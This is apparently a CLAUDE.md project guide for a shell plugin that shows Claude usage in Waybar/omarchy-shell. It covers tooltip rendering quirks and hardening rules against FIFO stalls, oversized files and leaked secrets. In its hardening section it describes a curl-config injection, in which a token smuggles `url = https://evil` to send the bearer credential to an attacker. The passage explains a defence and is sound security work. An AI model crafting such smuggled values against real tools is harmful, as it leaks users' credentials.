# CLAUDE.md

## Tooling

- Install: `make install PREFIX=~/.local` (or `sudo make install`)
- No build step or linter; tests live in `tests/` (run `bash tests/test_*.sh`)

## Non-Obvious Rules

- **Quickshell emits NEITHER `started` NOR `exited` when the command does not exist** — `running` just drops back to false. That is the only signal a failed start gives. Anything that waits on `onExited` to leave a loading state hangs for ever when the CLI is not installed, which is the first run of everyone who installs the plugin from the marketplace: the plugin is a git clone, the CLI is a package, and nothing installs the second for you. The `onRunningChanged` guard in the panel's `Process` is what makes the not-installed message reachable — verified against a running shell, not assumed.

- **A tooltip meter is PARKED, not rendered in place.** The bar has to reach the tooltip's right edge, and that edge is the widest TEXT line — which does not exist yet while the lines are being collected. So a meter pushes `METER:<i>` into `lines` plus one entry in the parallel `meter_*` arrays, and the width pass resolves it. The width pass MUST skip `METER:` lines, or the measurement is circular. Every meter in one tooltip gets the SAME bar length: they stack, so a reader compares them against each other.
- `BAR_LEN` is mutated for the tooltip AFTER the bar text is built. `GRAD_CELLS` is indexed by cell position, so it has to be rebuilt (`GRAD_CELLS=(); init_grad_cells`) right after — a longer bar otherwise reads past the end of the array, which is fatal under `set -u`.

- The script must **always exit 0**, even on errors — Waybar hides modules that exit non-zero. Use `die()` for error output.
- All output must be valid Waybar JSON: `{"text":"...", "tooltip":"...", "class":"..."}`
- Tooltip uses **Pango markup** for rich formatting (colors, bold, box-drawing borders)
- `set -euo pipefail` is enforced — all variables must be set before use
- Bar text is wrapped in Pango `<span foreground='...'>` for coloring — raw text won't render colors
- OAuth client ID (`9d1c250a-...`) is the public Claude CLI client ID, not a secret
- Cache writes use atomic `mktemp` + `mv` to avoid partial reads from concurrent Waybar instances
- `flock` serializes API calls across multi-monitor Waybar instances sharing the same cache

## Hardening rules — the widget runs INSIDE omarchy-shell

The plugin is not a short-lived Waybar exec here: it lives in the long-running
shell process. A read that never returns does not degrade the widget, it takes
the whole shell down. These four rules exist for that, and a security review of
the plugin marketplace checks them. All four have regression tests in
`tests/test_hardening.sh`.

- **Every read of a file this script does not own goes through `read_bounded`.**
  Credentials, the usage/credits cache, `.last_error`, the Omarchy theme, the
  pywal palette. The `[[ -f ]]` inside it is what rejects a FIFO (verified with
  `mkfifo`: `-f` is false for FIFO, socket, directory and device); the byte cap
  is what keeps a giant file out of a shell variable. 64 KiB for machine-written
  state, 256 KiB for a theme.
- **Every write on a predictable path goes through `writable_path` first.**
  `open(2)` for writing on a FIFO blocks for a reader that never comes, so the
  write side stalls exactly like the read side. `exec 9>` on the fetch lock was
  the real one. `touch` is safe (coreutils uses `O_NONBLOCK`) and `mv` is
  `rename(2)`, so the mktemp+mv cache writes need no guard.
- **`curl_auth_cfg` is the ONLY place a curl config file is built, and it
  rejects.** The config parser is line oriented: a newline inside a value ends
  the line and the rest parses as fresh options. A token carrying
  `url = https://evil` plus `insecure` gets the attacker a second transfer with
  the credential attached — proven against a local TLS listener — and
  `--proto '=https'` does not stop it, because the attacker simply picks an
  https URL. Escaping is the wrong answer: a bearer with a line break is a
  tampered file, so `token_is_safe` rejects it at BOTH sources, the credentials
  file and the refresh response.
- **The panel refuses to retain more than 1 MiB of CLI output.** A tripwire in
  the `StdioCollector`, not a limit — the stream is already buffered by then.
  Its message must survive `finalizeRun`, which is why the not-installed hint
  is gated on `loadError === ""`: the tripwire also leaves `capturedText` empty,
  and there "not installed" is plainly false.

Secrets never go in argv. The bearer token and the refresh token both reach
curl through stdin (`--config -` and `--data @-`), because `/proc/<pid>/cmdline`
is readable by every process of this user for the length of the transfer.
